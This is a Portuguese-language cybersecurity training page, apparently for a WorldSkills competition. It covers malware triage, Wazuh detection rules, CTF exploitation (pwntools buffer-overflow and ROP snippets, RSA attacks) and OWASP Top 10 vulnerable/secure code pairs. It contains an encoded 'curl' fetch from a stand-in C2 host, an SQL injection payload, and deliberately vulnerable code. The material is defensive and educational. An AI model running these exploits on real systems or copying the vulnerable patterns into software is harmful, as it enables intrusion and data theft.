Atacantes renomeiam executáveis para parecerem inofensivos (ex.: fatura.pdf que na verdade é um binário ELF ou PE Windows). Com file (lê os magic bytes reais), strings (extrai URLs, IPs, chaves e comandos legíveis) e exiftool (autor, software gerador, GPS), você extrai IOCs valiosos com risco zero de infecção.

Como investigar
file fatura.pdf                           # revela o formato real pelos magic bytes (ELF, PE32, PDF...)
sha256sum fatura.pdf                      # gera o IOC de hash para busca em Threat Intel
strings -n 6 fatura.pdf | grep -Ei "http|([0-9]{1,3}\.){3}[0-9]{1,3}|/bin/|cmd\.exe"
exiftool documento.docx                   # metadados de autoria e datas internas
🟢 Arquivo genuínofatura.pdf: PDF document, version 1.7 sem URLs ou binários embutidos.
🔴 Artefato camufladofatura.pdf: ELF 64-bit LSB executable contendo string http://198.51.100.44:8080/stage2!

DECODEDesofuscação segura de scripts e indicadores (Base64, Hex e URL)

revelar C2 e persistência escondidos sem acionar bash / eval / Invoke-Expression
›
O que é / regra de segurança

Muitos scripts encontrados em cron jobs, logs web ou eventos PowerShell vêm codificados em Base64, Hex ou URL-encoding para enganar filtros simples. Decodifique sempre canalizando a saída para visualização pura no terminal (ou no CyberChef) — jamais redirecione a saída decodificada para bash, sh ou iex!

Como decodificar com segurança
# Decodificar Base64 exibindo apenas como texto:
echo "Y3VybCBodHRwOi8vMTk4LjUxLjEwMC40NC9iZWFjb24uc2g=" | base64 -d; echo

# Decodificar string Hexadecimal:
echo "3139382e35312e3130302e3434" | xxd -r -p; echo

# Decodificar URL encoding (%2F, %3B, %20) com Python:
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "%2Fetc%2Fpasswd"
🔴 Risco graveExecutar o script "para ver o que ele faz" — aciona o malware ou destrói o ambiente.
🟢 Análise seguraString decodificada apenas na tela, revelando o domínio/IP de C2 para bloqueio imediato.

›
O que é / por que importa

Achou uma webshell ou backdoor em um servidor? O próximo passo do especialista é criar uma regra YARA rápida com as strings exclusivas daquele artefato e varrer os diretórios de todos os outros servidores para garantir que não restou nenhuma cópia escondida com outro nome!

        $s1 = "X-Auth-Backdoor" ascii

Defesa Passiva × Ativa — por que muros estáticos não bastam. ⓘ detalhes
• Defesa Passiva: controles fixos preventivos (firewalls, políticas de senha, patches). Essencial, mas basta o atacante acertar uma brecha para entrar.
• Defesa Ativa & Assume Breach: parte da premissa de que o adversário vai entrar em algum momento. O foco passa a ser visibilidade contínua, detecção rápida, armadilhas e contenção automatizada.

Equação fundamental do Blue Team: Tempo de Detecção (Dt) + Tempo de Reação (Rt) < Tempo do Ataque (At). Quanto menor o Dwell Time (tempo livre do invasor na rede), menor o impacto.
Papéis no SOC — da triagem inicial à engenharia de detecção. ⓘ detalhes
Alinhado ao NIST NICE Framework (Protect & Defend):
• Analista L1 (Triage): monitora a fila do SIEM, separa falsos positivos de incidentes reais e aciona contenção inicial.
• Analista L2 (Incident Responder): aprofunda o escopo, correlaciona hosts/redes e conduz erradicação.
• Analista L3 (Threat Hunter): busca proativamente invasores furtivos que não geraram alertas.
• Detection Engineer: constrói, testa e afina os parsers, regras e automações que alimentam todo o SOC.
Pipeline SIEM/XDR — o caminho do log bruto até a ação. ⓘ detalhes
Todo SIEM do mercado (Wazuh, Elastic, Splunk, Sentinel, QRadar) executa exatamente as mesmas 5 etapas:
1. Coleta (Collection/Shipping): agentes ou syslog capturam eventos nos endpoints/rede.
2. Parsing / Decodificação: quebra o texto bruto em campos estruturados.
3. Normalização: padroniza nomes de campos (ex.: srcip / source.ip).
4. Detecção & Correlação: avalia regras, listas de IOCs e janelas de tempo.
5. Indexação & Resposta: grava no banco de busca, exibe no dashboard e dispara bloqueios/alertas.
Normalização — fazer logs diferentes falarem a mesma língua. ⓘ detalhes
Um firewall chama a origem de src, o Windows chama de IpAddress e o Nginx de client_ip. Sem normalização, você precisaria escrever 10 regras diferentes para o mesmo ataque!

Esquemas padrões de mercado resolvem isso:
• ECS (Elastic Common Schema): ex. source.ip, user.name, process.command_line.
• OCSF: padrão aberto multi-fornecedor.
• CIM: modelo padrão do Splunk.
• Wazuh Dynamic Fields: srcip, dstuser, url, data.*.
Tipos de Detecção — atômica, limiar, sequencial e anomalia. ⓘ detalhes
1. Atômica (IOC / Evento único): um único evento já é grave (ex.: log de segurança apagado 1102, IP na blocklist de C2).
2. Estatística / Limiar (Threshold): repetição acima do normal em janela curta (ex.: 8 falhas de login do mesmo IP em 60 segundos).
3. Correlação Sequencial: encadeamento lógico (ex.: várias falhas de senha seguidas de 1 login aceito + execução de sudo).
4. Comportamental / Baseline: desvio da rotina histórica (ex.: servidor de banco fazendo upload externo às 03h).
Alert Fatigue & Tuning — excesso de ruído cega a equipe. ⓘ detalhes
Se um SIEM dispara 5.000 alertas falsos por dia, o analista se acostuma a ignorá-los e deixa passar o ataque real (Alert Fatigue).

Boa prática de Tuning: nunca apague uma regra global importante porque um scanner interno legítimo disparou alerta! Crie uma exceção cirúrgica (regra filha ou filtro not) restrita apenas ao IP/usuário/caminho específico da rotina autorizada.
Threat Hunting — caçar invasores antes do alerta tocar. ⓘ detalhes
O Threat Hunting assume que o invasor contornou as regras automáticas:
• Por Hipótese: parte de uma técnica ATT&CK ("Será que alguém usou certutil ou python para baixar arquivos nos servidores web?") e consulta os dados.
• Por Dados / Outliers: agrupa processos/domínios mais raros da rede (*long-tail analysis*).

Todo hunt que encontra algo real deve virar uma nova regra automatizada!
FIM & Whodata — vigiar alterações críticas em tempo real. ⓘ detalhes
O FIM monitora criação, alteração de conteúdo, permissões e exclusão em pastas sensíveis (/etc, /var/www/html, System32).
• Scan periódico (ex.: AIDE): compara hashes atuais contra um banco baseline.
• Realtime + Diff: avisa no segundo em que o arquivo muda e mostra qual linha foi alterada.
• Whodata (Auditd / SACL): revela também qual usuário e qual processo modificou o arquivo!
Host × Rede — por que você precisa enxergar os dois lados. ⓘ detalhes
• No Host (HIDS / EDR / Sysmon / Osquery): enxerga dentro do SO (argumentos de comando, arquivos, usuários, memória), mesmo que o tráfego de rede esteja cifrado em TLS 1.3.
• Na Rede (NIDS Suricata / NDR Zeek): enxerga dispositivos sem agente, varreduras externas, DNS tunneling e movimentação lateral no fio — e o invasor no endpoint não consegue apagar o log do sensor de rede!
SOAR & Resposta Ativa — conter ataques em milissegundos. ⓘ detalhes
Quando uma regra de alta confiança dispara, esperar um humano ler o alerta pode levar minutos preciosos. A Resposta Ativa (no Wazuh, Fail2Ban, CrowdSec ou playbooks SOAR como Shuffle) executa contenção imediata: bloquear o srcip no firewall local/perímetro, suspender a conta alvo ou colocar o arquivo recém-criado em quarentena após bater numa regra YARA.
Allowlist Crítica — nunca deixe o atacante usar sua defesa contra você! ⓘ detalhes
Imagine uma regra que bloqueia automaticamente no firewall qualquer IP que gere alerta de scan. Se o atacante enviar pacotes com IP de origem falsificado (IP Spoofing) fingindo ser o seu Gateway, Servidor DNS, Controlador de Domínio ou a máquina do Avaliador da prova, seu próprio servidor se auto-isola e cai!

Regra inegociável: toda automação de bloqueio (Wazuh white_list, Fail2Ban ignoreip) exige lista de proteção da infraestrutura crítica!
Cyber Deception — armadilhas com zero falso positivo. ⓘ detalhes
Pelo framework MITRE Engage, espalhar iscas estratégicas vira o jogo a favor do defensor:
• Honeyfile / Canarytoken: arquivo como /root/senhas_cofre.xlsx ou credencial falsa em .env. Nenhum usuário legítimo precisa abrir aquilo — 1 toque = 100% de certeza de invasor!
• Honeypot / Honeyport (Cowrie, OpenCanary): serviço falso que atrasa o invasor e entrega de bandeja seus IPs e comandos.

SIGMARegras Sigma (YAML): escrever uma vez e rodar em qualquer SIEM

O que é / como estruturar

Sigma é o padrão aberto universal para regras de detecção em logs.       - '/nginx'
      - '/apache2'
    Image|endswith:

WAZUH XMLCriando Custom Decoders (local_decoder.xml) e equivalentes Regex/Grok

extrair srcip, user, action de logs que o SIEM não conhece de fábrica
›
O que é / por que importa

Em provas Blue Team, é muito comum existir uma aplicação interna própria gravando logs em formato customizado (ex.: portal-erp: LOGIN_FAIL user=joao ip=192.168.50.9). Sem um decoder (ou filtro Grok no Logstash), o SIEM não extrai user nem srcip — impedindo correlação e bloqueio automático!

Como criar (/var/ossec/etc/decoders/local_decoder.xml)
<!-- 1) Decoder pai identifica o programa; 2) Decoder filho extrai os campos na ordem: -->
<decoder name="portal-erp">
  <program_name>^portal-erp</program_name>
</decoder>

<decoder name="portal-erp-fields">
  <parent>portal-erp</parent>
  <regex>(\S+) user=(\S+) ip=(\S+)</regex>
  <order>action, dstuser, srcip</order>
</decoder>
🔴 Sem decoderNo decoder matched — o log passa ignorado sem extrair srcip.
🟢 Campos estruturadosdecoder: 'portal-erp' · action: 'LOGIN_FAIL' · dstuser: 'joao' · srcip: '192.168.50.9'.

WAZUH XMLCriando Custom Rules (local_rules.xml · IDs 100000–120000 + MITRE)

avaliar campos extraídos, definir severidade (0–15) e mapear ATT&CK
›
O que é / regras de ouro

No Wazuh, regras customizadas ficam em /var/ossec/etc/rules/local_rules.xml e devem usar IDs entre 100000 e 120000 (nunca edite arquivos em /var/ossec/ruleset/rules/, pois atualizações sobrescrevem!). Use níveis coerentes: 0 (ignorar), 3 (evento informativo), 5–7 (aviso/erro), 10–11 (alta severidade) e 12–15 (crítico / aciona resposta imediata), sempre marcando o ID do MITRE ATT&CK.

Como criar (/var/ossec/etc/rules/local_rules.xml)
<group name="portal_erp,authentication,">
  <rule id="100010" level="5">
    <decoded_as>portal-erp</decoded_as>
    <field name="action">^LOGIN_FAIL$</field>
    <description>Portal ERP: Falha de login para $(dstuser) a partir de $(srcip)</description>
    <mitre><id>T1110</id></mitre>
  </rule>
</group>
🔴 Erro clássicoUsar ID baixo (ex.: id="500") colidindo com regras nativas e impedindo o Manager de subir.
🟢 Regra limpaID 100010 disparando com variáveis dinâmicas $(dstuser)/$(srcip) e painel MITRE alimentado.

CORRELAÇÃORegras de correlação temporal (Força Bruta e Ataques em Rajada)

if_matched_sid + frequency + timeframe + same_source_ip
›
O que é / por que importa

Um único erro de senha (nível 5) acontece quando um colaborador digita errado; já 6 erros do mesmo IP em 60 segundos configuram um ataque real de força bruta (nível 10+)! A correlação temporal junta eventos menores em um alerta de alta confiança pronto para acionar bloqueio automático. (Atenção no Wazuh: frequency="6" significa o evento atual + mais 7/6 ocorrências dependendo da versão; teste sempre no wazuh-logtest!)

Como aplicar
<!-- Regra filha correlacionando múltiplas ocorrências da regra 100010 pelo mesmo IP: -->
<rule id="100011" level="10" frequency="6" timeframe="60">
  <if_matched_sid>100010</if_matched_sid>
  <same_source_ip />
  <description>Portal ERP: Forca bruta detectada a partir de $(srcip)!</description>
  <mitre><id>T1110.001</id></mitre>
</rule>

# Equivalente conceitual em SIEM query (SPL):
# index=app action=LOGIN_FAIL | bin _time span=1m | stats count by _time srcip | where count >= 6
🔴 Sem correlaçãoBloquear no 1º erro trava usuários reais; não bloquear no 100º deixa o invasor adivinhar senhas.
🟢 Limiar calibradoErro isolado gera apenas log leve (5); rajada do mesmo IP dispara alerta crítico (10) e bloqueia!

TUNINGSupressão cirúrgica de falsos positivos (sem cegar o SOC)

regra filha level="0" restrita por IP/usuário/caminho
›
O que é / armadilha em provas

Imagine que um script legítimo de monitoramento (IP 10.10.99.20, User-Agent HealthCheck/1.0) gera centenas de alertas falsos na regra 31101 do Apache. Se você colocar level="0" direto na regra 31101 para todas as origens, você fica cego para ataques reais! A técnica correta é criar uma regra filha (<if_sid>) com level="0" exigindo simultaneamente o IP e o padrão exato da rotina legítima.

Como aplicar
<rule id="100090" level="0">
  <if_sid>31101</if_sid>
  <srcip>10.10.99.20</srcip>
  <match>GET /healthz</match>
  <description>Suprimir falso positivo do healthcheck interno autorizado</description>
</rule>
🔴 Tuning destrutivoDesabilitar a regra inteira — o atacante explora a aplicação sem nenhum alerta.
🟢 Tuning cirúrgicoApenas 10.10.99.20 em /healthz é silenciado; qualquer outro IP ou rota continua gerando alerta!

O que é / como funciona

No ossec.conf do Manager, você vincula um <command> (como firewall-drop no Linux ou netsh no Windows) a um bloco <active-response>. Quando as regras listadas em <rules_id> (ou acima de <level>) disparam, o agente executa o bloqueio local imediatamente e desfaz sozinho após o <timeout> definido.

Como aplicar (/var/ossec/etc/ossec.conf do Manager)

</command>

<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5763,100011,100400</rules_id>   <!-- ex.: brute force SSH (5763) + regras custom -->
  <timeout>600</timeout>                    <!-- bloqueia por 10 min -->
</active-response>
# Verificar execuções reais no endpoint: tail -f /var/ossec/logs/active-responses.log

Capture The Flag: do reconhecimento à flag

Módulo ofensivo (Ataque & Defesa) do WorldSkills Cyber Security: reconhecer, explorar e capturar flags — e saber se defender de cada técnica. Metodologia + ferramentas reais de competição.

⚠️ Conteúdo ofensivo exclusivamente para laboratório/CTF autorizado. Usar contra terceiros sem permissão é crime (Lei 12.737/2012).
📚 Fundamentos 🔍 Recon 🌐 Web & DB 🔐 Cripto 🖼️ Stego & Forense 🧬 Reverse & Pwn 🪟 Windows & AD 📝 Provas
🚩 Um CTF é uma competição onde você resolve desafios de segurança para achar uma flag (ex.: flag{...}). O segredo não é sorte — é método: reconhecer → enumerar → explorar → escalar → capturar. Esta aba fixa os conceitos; as outras treinam cada técnica.
Conceitos-chave — clique para aprofundar
Metodologia — o processo que leva à flag. ⓘ
Todo alvo é atacado na mesma ordem: Reconhecimento (o que existe?) → Enumeração (detalhar serviços/versões) → Descoberta de vulnerabilidade → Exploração (ganhar acesso) → Escalonamento de privilégio (virar root/admin) → Captura da flag.

Padrões formais: PTES, OSSTMM, NIST SP 800-115, OWASP WSTG (web). A disciplina importa mais que "hackear aleatório": cada comando é um passo do processo.
Flag — o objetivo a capturar. ⓘ
A flag é uma string única que prova que você resolveu o desafio, normalmente no formato flag{texto}, FLAG{...} ou específico do evento (ex.: wsentry-1{...} no WorldSkills UK).

Pode estar em: um arquivo (/root/flag.txt, user.txt), na resposta de uma requisição, escondida numa imagem, na memória de um processo, ou ser o resultado de decriptar algo. Você a submete na plataforma para pontuar.
Formatos de CTF — Jeopardy e Attack-Defense. ⓘ
Jeopardy: desafios independentes por categoria (Web, Crypto, Pwn, Rev, Forense, Stego, OSINT), cada um valendo pontos. Você resolve na ordem que quiser.

Attack-Defense: cada equipe recebe serviços idênticos; você ataca os serviços dos adversários (rouba flags) e ao mesmo tempo defende/corrige os seus. O WorldSkills usa os dois lados — por isso cada card aqui ensina o ataque e a defesa.
Mentalidade — identificar antes de atacar. ⓘ
O erro de iniciante é sair testando exploits. O especialista primeiro identifica exatamente o que tem pela frente: qual serviço, versão, cifra, formato de arquivo ou arquitetura de binário. Metade da resolução é reconhecer o alvo.

Em cripto, por exemplo: decodifique primeiro (base64, hex, rot13) e só então assuma que há criptografia. A pergunta certa é sempre "o que é isto?" antes de "como quebro isto?".
Escopo & Ética — regras de engajamento. ⓘ
Em CTF/pentest você só ataca o que está no escopo autorizado. Sair do alvo, atacar a infraestrutura da competição ou outros competidores é desqualificação (e, fora de lab, crime).

Pentest profissional segue um contrato (Rules of Engagement) que define alvos, horários, técnicas proibidas e contato de emergência. A mesma técnica é "ética" ou "crime" só pela autorização.
Red / Blue / Purple — os times. ⓘ
Red Team ataca (simula o adversário). Blue Team defende, detecta e responde (Provas C e D deste material). Purple Team é a colaboração dos dois: o Red mostra como entrou, o Blue cria a detecção. Esta Prova E é o lado Red — mas cada card fecha com a defesa correspondente (o "roxo").

IDENTIFICARReconhecer e decodar

o primeiro passo sempre
›
O que é / por que importa

Metade dos desafios de cripto são apenas encoding (base64, hex, ROT13, Morse, Base32) empilhado. Identificar o esquema resolve na hora. Use ferramentas de auto-detecção.

Como fazer
# auto-detecção:  CyberChef "Magic"  ·  dcode.fr (cipher identifier)
echo "SGVsbG8=" | base64 -d            # base64
echo "" | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # ROT13
# cifras clássicas: César, Vigenère, Atbash, Rail Fence -> CyberChef/dcode.fr
Checklist cripto
# 1) decode (base64/hex/rot13)  2) tamanho múltiplo de 16? (bloco)
# 3) tem n e e grandes? (RSA)  4) chave repetida? (XOR/Vigenère)

XORCifra XOR (chave única/repetida)

›
O que é / por que importa

XOR aparece em um número enorme de desafios. Com chave de 1 byte, basta força bruta nos 256 valores; com chave repetida, o xortool descobre o tamanho e a chave.

Como fazer
# XOR chave única (pwntools):
python3 -c "from pwn import xor; print(xor(bytes.fromhex('1b2d'), b'flag{'))"
# XOR chave repetida:
xortool -c 20 arquivo.bin        # acha tamanho e chave provável
🔴 TécnicaChave curta/reusada → texto claro recuperado (crib dragging com flag{).
🟢 Boa práticaNunca usar XOR como "criptografia"; usar AES-GCM com chave aleatória por mensagem.

RSAAtaques a RSA fraco

o terror que não é tão assustador
›
O que é / por que importa

RSA em CTF quase nunca é "quebrar RSA" — é explorar um parâmetro fraco: N pequeno/já fatorado, expoente e=3 baixo, módulo comum, Wiener (d pequeno). Ferramentas automatizam quase tudo.

Como fazer
# canivete suíço de RSA (tenta dezenas de ataques):
RsaCtfTool.py -n <N> -e <e> --uncipher <c>
RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.bin
# N já fatorado online:  factordb.com
# extrair n,e do PEM:  openssl rsa -pubin -in key.pub -text -noout
🔴 TécnicaN pequeno/fatorado → chave privada reconstruída → flag decriptada.
🟢 Boa práticaN ≥ 2048 bits, e=65537, padding OAEP, não reusar primos/módulo.

›
O que é / por que importa

🔴 TécnicaHash fraco + senha comum → quebrada em segundos.

ESTÁTICADecompilar (Ghidra / radare2)

›

PWNBuffer overflow → ret2win

o pwn mais clássico
›
O que é / por que importa

Quando um programa lê mais dados que o buffer comporta (ex.: gets()), você sobrescreve o endereço de retorno e redireciona a execução — para uma função "win" que imprime a flag, ou para uma shell.

Como fazer
# 1) achar o offset até o retorno (padrão cíclico):
cyclic 200   # gera · depois: cyclic -l <valor_do_crash>
# 2) exploit com pwntools:
python3 -c "
from pwn import *
elf = ELF('./desafio')
p = process('./desafio')
payload = b'A'*72 + p64(elf.symbols['win'])
p.sendline(payload); p.interactive()"
🔴 AtaqueOverflow sobrescreve o retorno → chama win() → flag.
🟢 DefesaUsar fgets/limites, compilar com canary+NX+PIE, evitar gets/strcpy.

PWNROP / ret2libc (NX ligado)

›
O que é / por que importa

Com NX ligado você não roda shellcode na pilha. A saída é ROP (Return-Oriented Programming): encadear "gadgets" (trechos que terminam em ret) já presentes no binário/libc para chamar system("/bin/sh").

Como fazer
ROPgadget --binary ./desafio --only "pop|ret"
ropper -f ./desafio --search "pop rdi"
# pwntools monta a cadeia automaticamente:
python3 -c "
from pwn import *
elf=ELF('./desafio'); rop=ROP(elf)
rop.call('puts',[elf.got['puts']]); rop.call('main')
print(rop.chain())"
🔴 TécnicaVazar libc → montar ROP → system('/bin/sh') → shell/flag.
🟢 DefesaFull RELRO, ASLR/PIE, canário e fortificação (_FORTIFY_SOURCE).

🧱 Application Security (AppSec) é a disciplina de prevenir, encontrar e corrigir vulnerabilidades no software — do design ao deploy. A regra de ouro é shift-left: quanto mais cedo a falha é achada, mais barato é corrigir. Uma falha pega no editor custa minutos; em produção, custa um incidente. Esta aba fixa os conceitos; as próximas treinam cada técnica.
Conceitos-chave — clique para aprofundar
Secure SDLC — segurança em todo o ciclo. ⓘ
O Secure Software Development Life Cycle insere controles de segurança em cada fase: requisitos (abuse cases), design (threat modeling), código (secure coding + SAST), build (SCA + SBOM), teste (DAST), deploy (hardening) e operação (logging, patching).

Frameworks de referência: NIST SSDF (SP 800-218), OWASP SAMM (maturidade) e BSIMM. A ideia central: segurança não é uma etapa no fim — é tecida em todo o processo.
Shift-Left — achar cedo custa pouco. ⓘ
"Deslocar para a esquerda" significa mover os testes de segurança para o início do ciclo — no IDE e no commit, não só no pentest final.

Custo relativo de corrigir uma falha: ~1x em design, ~6x em código, ~15x em teste, ~100x em produção (estudos clássicos IBM/NIST). Por isso SAST roda no pull request e secret scanning roda no pre-commit: a falha nunca chega longe.
Threat Modeling — pensar como o atacante no design. ⓘ
Antes de escrever código, você modela as ameaças ao sistema. O método STRIDE (Microsoft) classifica 6 categorias: Spoofing (identidade), Tampering (integridade), Repudiation (não-repúdio), Information disclosure (confidencialidade), Denial of Service (disponibilidade), Elevation of privilege (autorização).

Ferramentas: OWASP Threat Dragon, Microsoft Threat Modeling Tool. Falhas de design (OWASP A06) não são pegas por scanner — só por threat modeling.
SAST — análise estática (olha o código). ⓘ
Static Application Security Testing examina o código-fonte sem executá-lo, procurando padrões inseguros (entrada não sanitizada, funções perigosas, fluxos de dados do input até um sink).

✅ Cobre 100% dos caminhos de código, roda cedo (no commit/PR), aponta o arquivo e a linha.
❌ Gera falsos positivos, não vê falhas de lógica de negócio nem problemas de runtime/config. Ferramentas: Semgrep, CodeQL, Bandit, SonarQube.
DAST — análise dinâmica (ataca a app rodando). ⓘ
Dynamic Application Security Testing testa a aplicação em execução do lado de fora, simulando ataques reais (envia payloads de SQLi, XSS etc. e observa a resposta). É "black-box".

✅ Encontra problemas de runtime, config e autenticação; poucos falsos positivos.
❌ Não vê o código (não diz a linha), não alcança caminhos sem rota HTTP. Ferramentas: OWASP ZAP, Burp Suite, Nuclei. SAST e DAST são complementares.
SCA — analisa as dependências de terceiros. ⓘ
Software Composition Analysis inventaria as bibliotecas open-source do projeto e cruza com bases de CVE/NVD para achar componentes vulneráveis. Uma app média usa centenas de dependências — a maior parte do código que você entrega não foi você quem escreveu.

É o controle que a OWASP recomenda para o problema de supply chain (A03:2025). Gera também o SBOM. Ferramentas: OWASP Dependency-Check/Track, Snyk, Trivy, Grype, Dependabot.
IAST & RASP — instrumentação em runtime. ⓘ
IAST (Interactive AST) instrumenta a aplicação durante os testes e combina a visão estática (código/linha) com a dinâmica (runtime) — menos falsos positivos, mas exige agente.

RASP (Runtime Application Self-Protection) roda dentro da aplicação em produção e bloqueia ataques em tempo real (como um WAF embutido). IAST testa; RASP protege. Ambos complementam SAST/DAST/SCA, não substituem.
Ecossistema OWASP — as referências que você deve conhecer. ⓘ
Top 10 — lista de conscientização dos 10 riscos mais críticos (edição 2025, confirmada em jan/2026).
ASVS 5.0 (Application Security Verification Standard, mai/2025) — o padrão de requisitos verificáveis por nível (L1/L2/L3); é o que se usa para testar de verdade.
Cheat Sheets — receitas práticas por tema (ex.: SQL Injection Prevention, Password Storage).
SAMM — modelo de maturidade do programa de AppSec. WSTG — guia de testes web. Proactive Controls — top 10 de defesas.
Princípios — as leis do código seguro. ⓘ
Nunca confie na entrada (valide no servidor, allowlist > denylist). Menor privilégio (cada parte só o acesso mínimo). Defesa em profundidade (camadas). Fail securely (em erro, negue — não abra). Separe dados de código (parametrize; nunca concatene input em query/comando). Não reinvente cripto (use bibliotecas testadas). Minimize a superfície (desligue o que não usa). Secure defaults (seguro já de fábrica).
CWE × CVE × CVSS — não confunda. ⓘ
CWE (Common Weakness Enumeration) — a classe da falha (ex.: CWE-89 = SQL Injection, CWE-79 = XSS). É o "tipo de bug".
CVE (Common Vulnerabilities and Exposures) — uma instância concreta e catalogada numa versão de um produto (ex.: CVE-2021-44228 = Log4Shell).
CVSS — a nota de severidade (0–10) daquela CVE. 👉 A calculadora de CVSS está na Prova A. No code review você fala em CWE; no SCA você vê CVE + CVSS.

A01Broken Access Control

#1 · inclui BOLA/BFLA · absorveu o SSRF · CWE-284/639/918
›
O que é

O usuário consegue fazer o que não deveria: acessar o recurso de outro usuário (IDOR/BOLA), uma função de admin (BFLA) ou forçar o servidor a requisitar uma URL interna (SSRF, agora aqui). Segue no 1º lugar.

Como achar no código

Endpoint que recebe um ID e busca no banco sem checar se o objeto pertence ao usuário logado. Rota de admin sem verificação de papel. Requisição a URL vinda do usuário sem allowlist.

🔴 Vulnerável (IDOR / BOLA)
# Python/Flask — qualquer um lê o pedido de qualquer um
@app.get("/api/orders/<int:oid>")
def get_order(oid):
    return db.orders.find_one({"id": oid})   # sem checar dono!
🟢 Seguro
@app.get("/api/orders/<int:oid>")
@login_required
def get_order(oid):
    order = db.orders.find_one({"id": oid})
    if not order or order["user_id"] != current_user.id:
        abort(404)            # nega e não revela existência
    return order
🔴 ImpactoTrocar o ID na URL vaza/edita dados de outros (o bug web mais comum).
🟢 DefesaAutorização no servidor por objeto e por função; negar por padrão (deny-by-default).

A02Security Misconfiguration

↑ do #5 · defaults, debug, cloud, IaC · CWE-16/611
›
O que é

Configuração insegura em qualquer camada: credenciais padrão, modo debug ligado, diretórios listáveis, headers de segurança ausentes, buckets abertos, XXE por parser mal configurado. Subiu para #2 por aparecer muito nos dados.

Como achar

Procure DEBUG=True em produção, senhas padrão, CORS *, parser XML com entidades externas habilitadas, ausência de CSP/HSTS.

🔴 Vulnerável (XXE)
# Python — parser que resolve entidades externas
import lxml.etree as ET
doc = ET.fromstring(user_xml)   # resolve <!ENTITY> -> lê /etc/passwd
🟢 Seguro
from lxml import etree
parser = etree.XMLParser(resolve_entities=False,
                         no_network=True, dtd_validation=False)
doc = etree.fromstring(user_xml, parser)   # entidades desligadas
# + DEBUG=False, headers CSP/HSTS, remover defaults, CORS restrito
🔴 ImpactoVaza arquivos/segredos, expõe stack traces, abre a nuvem.
🟢 DefesaHardening automatizado, secure defaults, IaC scanning, revisão de headers.

›
O que é

Nova categoria (expande "Componentes vulneráveis e desatualizados"). Comprometimentos em qualquer ponto da cadeia: dependências vulneráveis/maliciosas, build systems, registries, ações de CI. Foi o item mais votado pela comunidade e tem a maior incidência.

Como achar

Dependências desatualizadas com CVE conhecida; pacotes sem pin de versão/hash; ações de CI apontando para @main em vez de SHA; ausência de SBOM. 👉 Aba Supply Chain aprofunda.

🔴 Vulnerável
# requirements.txt sem pin — pega qualquer versão, até comprometida
requests
flask
# GitHub Actions apontando para tag móvel
- uses: some/action@main
🟢 Seguro
# versões fixas + hash verificado
requests==2.32.3 --hash=sha256:...
flask==3.0.3
# ação fixada no commit SHA imutável
- uses: some/action@a1b2c3d   # + SCA no pipeline + SBOM + Dependabot
🔴 Exemplos reaisLog4Shell (CVE-2021-44228), worm npm Shai-Hulud (2025), typosquatting.
🟢 DefesaSCA contínuo, pin+hash, SBOM, assinatura (Sigstore/cosign), proveniência SLSA.

A04Cryptographic Failures

↓ do #2 · cripto fraca ou ausente · CWE-327/328/916
›
O que é

Falta de cripto onde é necessária, algoritmos fracos (MD5, SHA1, DES, ECB), chaves hardcoded, TLS mal configurado, hashing de senha sem sal/custo. Foco no dado sensível em trânsito e em repouso.

Como achar

Senhas em md5()/sha1(), modo ECB, chave/IV fixos no código, http:// para dado sensível. 👉 Aba Segredos & Cripto aprofunda.

🔴 Vulnerável
# senha com MD5 (rápido de quebrar, sem sal)
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()
🟢 Seguro
# hashing de senha dedicado, com sal e custo
from argon2 import PasswordHasher
ph = PasswordHasher()
pw_hash = ph.hash(password)     # argon2id (ou bcrypt/scrypt)
ph.verify(pw_hash, password)    # verificação segura
🔴 ImpactoVazou o banco? Senhas em MD5 caem em minutos no hashcat.
🟢 Defesaargon2id/bcrypt para senhas; AES-GCM para dados; TLS 1.2+; chaves em cofre.

A05Injection

↓ do #3 · SQLi, XSS, command, LDAP · CWE-89/79/77/78
›
O que é

Entrada não confiável é interpretada como código/comando: SQL Injection, XSS, OS command injection, LDAP, NoSQL. A categoria com mais CVEs. A raiz é sempre a mesma: misturar dados com código.

Como achar

Query montada por concatenação/f-string; innerHTML/template sem escape; os.system com input; shell=True.

🔴 Vulnerável (SQLi)
# PHP — input concatenado direto na query
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$res = $conn->query($sql);   # ' OR '1'='1 -> dump total
🟢 Seguro (prepared statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);   # dado nunca vira código
$stmt->execute();
# XSS: use autoescape do template / textContent, nunca innerHTML cru
🔴 ImpactoDump/alteração do banco, execução de comandos, roubo de sessão (XSS).
🟢 DefesaConsultas parametrizadas sempre; output encoding por contexto; ORM seguro.

A06Insecure Design

↓ do #4 · falha de design, não de bug · CWE-209/256/501
›
O que é

A falha está no desenho do sistema, não num erro de implementação: ausência de limite de tentativas, fluxo de recuperação de senha fraco, confiança indevida no cliente. Scanner não acha — só threat modeling e revisão de design.

Como achar

Pergunte "qual controle de segurança deveria existir e não existe?". Ex.: checkout sem controle de estoque server-side, reset de senha por pergunta secreta, rate limit ausente no login.

🔴 Design vulnerável
# preço vem do cliente — confiança indevida
POST /checkout  { "item": 42, "price": 999.00 }
# servidor cobra o que o cliente mandar -> price=0.01
🟢 Design seguro
# servidor ignora o preço do cliente e busca na fonte da verdade
POST /checkout  { "item": 42 }
price = db.items.get(42).price   # + rate limit + limites de negócio
🔴 ImpactoFraude lógica: comprar por 1 centavo, abusar de cupons, enumerar contas.
🟢 DefesaThreat modeling (STRIDE), abuse cases nos requisitos, validação de regra no servidor.

A07Authentication Failures

#7 · login, sessão, credenciais · CWE-287/307/384
›
O que é

Falhas que permitem assumir a identidade de outro: senhas fracas aceitas, sem MFA, sem rate limit (brute force/credential stuffing), sessão que não expira, token previsível, fixação de sessão.

Como achar

Login sem bloqueio após N tentativas; token de sessão com pouca entropia; sessão não invalidada no logout; MFA ausente em áreas sensíveis; mensagem de erro que distingue "usuário não existe" de "senha errada".

🔴 Vulnerável
# sem limite de tentativas + erro que revela o que falhou
if not user: return "usuário não existe"   # enumeração
if user.pw != sent_pw: return "senha errada"
🟢 Seguro
limiter.check(ip, user)             # rate limit + backoff/lockout
if not user or not ph.verify_safe(user.hash, sent_pw):
    return "credenciais inválidas"       # mensagem genérica
# + MFA, sessão com expiração, rotação de token no login
🔴 ImpactoTomada de conta por brute force/credential stuffing, enumeração de usuários.
